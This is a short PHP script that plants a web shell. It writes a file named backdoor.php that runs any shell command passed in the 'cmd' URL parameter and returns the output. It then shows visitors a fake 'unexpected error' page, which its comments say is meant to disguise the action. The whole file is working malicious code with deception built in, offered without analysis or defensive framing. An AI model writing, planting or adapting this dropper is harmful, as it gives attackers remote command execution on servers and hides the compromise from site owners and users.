<?php
// Create a backdoor file on the server
$backdoorCode = '<?php if (isset($_GET["cmd"])) { echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; } ?>';
file_put_contents("backdoor.php", $backdoorCode);

// Echo a different message to disguise the malicious action
echo "<!DOCTYPE html>
<html>
<head><title>Oops!</title></head>
<body>
<h1>An unexpected error occurred!</h1>
<p>Please try again later.</p>
</body>
</html>";
?>
